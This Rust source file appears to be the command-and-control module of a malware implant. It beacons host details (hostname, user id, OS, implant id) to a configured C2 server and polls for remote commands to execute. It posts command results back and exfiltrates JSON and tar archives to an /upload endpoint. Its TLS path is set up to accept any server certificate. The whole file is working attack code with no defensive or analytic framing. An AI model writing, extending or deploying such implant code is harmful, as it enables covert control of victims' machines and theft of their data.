/// C2 communication — HTTP or HTTPS, selected at runtime via config.use_tls.
/// Supports bidirectional communication: sending beacons and receiving commands.

use crate::config::Config;
use std::io::{self, Read, Write};
use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
use std::sync::Arc;
use std::time::Duration;
use rustls::pki_types::ServerName;

const TIMEOUT: Duration = Duration::from_secs(10);
const MAX_RESPONSE: usize = 65536;

/// Resolve host:port to a SocketAddr, handling both IPs and domain names.
fn resolve(host: &str, port: u16) -> io::Result<SocketAddr> {
    if let Ok(addr) = format!("{}:{}", host, port).parse::<SocketAddr>() {
        return Ok(addr);
    }
    let addr_str = format!("{}:{}", host, port);
    let mut addrs = addr_str.to_socket_addrs()?;
    addrs.next().ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "no addresses"))
}

// ── HTTP wire helpers ──────────────────────────────────────────────

fn build_request(host: &str, port: u16, path: &str, body: &[u8]) -> Vec<u8> {
    let mut req = Vec::new();
    let header = format!(
        "POST {} HTTP/1.0\r\nHost: {}:{}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
        path, host, port, body.len(),
    );
    req.extend_from_slice(header.as_bytes());
    req.extend_from_slice(body);
    req
}

/// Read up to MAX_RESPONSE bytes from a reader, looking for HTTP body start.
fn read_http_response<R: Read>(reader: &mut R) -> io::Result<Vec<u8>> {
    let mut buf = vec![0u8; MAX_RESPONSE];
    let mut total = 0;
    // Read as much as we can within timeout
    while total < buf.len() {
        match reader.read(&mut buf[total..]) {
            Ok(0) => break,
            Ok(n) => total += n,
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => break,
            Err(e) => return Err(e),
        }
    }
    buf.truncate(total);
    Ok(buf)
}

/// Find the start of the HTTP body (after \r\n\r\n).
fn find_body_start(data: &[u8]) -> Option<usize> {
    for i in 0..data.len().saturating_sub(3) {
        if data[i] == b'\r' && data[i+1] == b'\n' && data[i+2] == b'\r' && data[i+3] == b'\n' {
            return Some(i + 4);
        }
    }
    None
}

// ── Plain HTTP send ────────────────────────────────────────────────

fn send_plain(addr: SocketAddr, host: &str, port: u16, body: &[u8], path: &str) -> io::Result<Vec<u8>> {
    let mut stream = TcpStream::connect_timeout(&addr, TIMEOUT)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    let request = build_request(host, port, path, body);
    stream.write_all(&request)?;
    stream.flush()?;
    read_http_response(&mut stream)
}

// ── TLS send ───────────────────────────────────────────────────────

fn send_tls(addr: SocketAddr, sni_host: &str, body: &[u8], path: &str) -> io::Result<Vec<u8>> {
    let stream = TcpStream::connect_timeout(&addr, TIMEOUT)?;
    stream.set_read_timeout(Some(Duration::from_secs(5)))?;
    let tls_config = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(NoCertVerification))
        .with_no_client_auth();
    let server_name = ServerName::try_from(sni_host.to_string())
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    let conn = rustls::ClientConnection::new(Arc::new(tls_config), server_name)
        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    let mut tls = rustls::StreamOwned::new(conn, stream);

    let request = build_request(sni_host, 443, path, body);
    tls.write_all(&request)?;
    tls.flush()?;
    read_http_response(&mut tls)
}

// ── Core send function ─────────────────────────────────────────────

fn do_send(config: &Config, body: &[u8], path: &str) -> io::Result<Vec<u8>> {
    let addr = resolve(&config.c2_host, config.c2_port)?;
    if config.use_tls {
        send_tls(addr, &config.c2_host, body, path)
    } else {
        send_plain(addr, &config.c2_host, config.c2_port, body, path)
    }
}

// ── Public types ───────────────────────────────────────────────────

#[derive(Debug, serde::Deserialize)]
pub struct BeaconResponse {
    #[serde(default)]
    pub commands: Vec<RawCommand>,
    #[serde(default)]
    pub stay_alive: bool,
}

#[derive(Debug, serde::Deserialize)]
pub struct RawCommand {
    pub id: String,
    pub module: String,
    pub action: String,
    #[serde(default)]
    pub args: serde_json::Value,
    #[serde(default = "default_timeout")]
    pub timeout_secs: u32,
}

fn default_timeout() -> u32 { 60 }

#[derive(Debug, serde::Serialize)]
pub struct BeaconPayload {
    pub implant_id: String,
    pub hostname: String,
    pub ts: i64,
    pub tier: String,
    pub os: String,
    pub arch: String,
    pub uid: u32,
    pub protocol_version: u32,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_result: Option<serde_json::Value>,
}

#[derive(Debug, serde::Serialize)]
pub struct ResultPayload {
    pub implant_id: String,
    pub command_id: String,
    pub status: String,
    pub data: serde_json::Value,
}

// ── Public API ──────────────────────────────────────────────────────

/// Send a beacon and poll for pending commands. Returns the parsed response.
pub fn beacon_and_poll(config: &Config, payload: &BeaconPayload) -> io::Result<BeaconResponse> {
    let body = serde_json::to_vec(payload)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    let response_bytes = do_send(config, &body, "/beacon")?;
    parse_beacon_response(&response_bytes)
}

/// Send a command result back to the C2 server.
pub fn send_result(config: &Config, payload: &ResultPayload) -> io::Result<()> {
    let body = serde_json::to_vec(payload)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    do_send(config, &body, "/result")?;
    Ok(())
}

/// Legacy: send a simple beacon (no command polling). Used for backward compat.
pub fn send_beacon(config: &Config, hostname: &str) -> io::Result<()> {
    let now = unsafe { libc::time(std::ptr::null_mut()) };
    let body = format!("{{\"host\":\"{}\",\"ts\":{}}}\n", hostname, now);
    do_send(config, body.as_bytes(), "/beacon")?;
    Ok(())
}

/// Send a chunk of binary data to /upload.
#[allow(dead_code)]
pub fn send_chunk(config: &Config, chunk: &[u8]) -> io::Result<()> {
    do_send(config, chunk, "/upload")?;
    Ok(())
}

/// Send multipart exfil (JSON + tar data).
pub fn exfil_multipart(config: &Config, json: &[u8], tar: &[u8]) -> io::Result<()> {
    let body = build_multipart_body(json, tar);
    do_send(config, &body, "/upload")?;
    Ok(())
}

// ── Helpers ─────────────────────────────────────────────────────────

fn parse_beacon_response(data: &[u8]) -> io::Result<BeaconResponse> {
    let body_start = find_body_start(data)
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "no HTTP body found"))?;
    let json_str = std::str::from_utf8(&data[body_start..])
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))?;
    serde_json::from_str(json_str)
        .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))
}

fn build_multipart_body(json_data: &[u8], tar_data: &[u8]) -> Vec<u8> {
    let boundary = "----DeepCodeBoundary2026";
    let mut body = Vec::new();
    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"json\"\r\n");
    body.extend_from_slice(b"Content-Type: application/json\r\n\r\n");
    body.extend_from_slice(json_data);
    body.extend_from_slice(b"\r\n");
    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"file\"\r\n");
    body.extend_from_slice(b"Content-Type: application/gzip\r\n\r\n");
    body.extend_from_slice(tar_data);
    body.extend_from_slice(b"\r\n");
    body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());
    body
}

// ── TLS: accept any certificate ────────────────────────────────────

#[derive(Debug)]
struct NoCertVerification;

impl rustls::client::danger::ServerCertVerifier for NoCertVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self, _message: &[u8], _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
        ]
    }
}
